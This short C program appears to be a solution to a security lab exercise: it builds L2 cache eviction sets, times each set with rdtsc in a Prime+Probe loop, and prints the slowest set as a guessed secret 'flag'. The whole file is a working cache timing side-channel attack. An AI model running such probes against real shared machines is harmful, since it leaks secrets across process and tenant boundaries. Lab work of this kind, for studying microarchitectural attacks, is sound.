#include <stdio.h>
#include <stdint.h>
#include "util.h"

int main() {
    char *buf = get_buffer();  // lab-provided buffer
    char *eviction_sets[NUM_L2_CACHE_SETS][16];

    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_partial_eviction_set(eviction_sets[i], i);

    while (1) {
        uint64_t times[NUM_L2_CACHE_SETS];
        for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
            uint64_t start = rdtsc();
            for (int j = 0; j < 16; j++)
                (*(eviction_sets[set][j]))++;
            uint64_t end = rdtsc();
            times[set] = end - start;
        }

        int guessed_flag = 0;
        for (int i = 1; i < NUM_L2_CACHE_SETS; i++)
            if (times[i] > times[guessed_flag])
                guessed_flag = i;

        printf("Guessed flag: %d\n", guessed_flag);
    }

    return 0;
}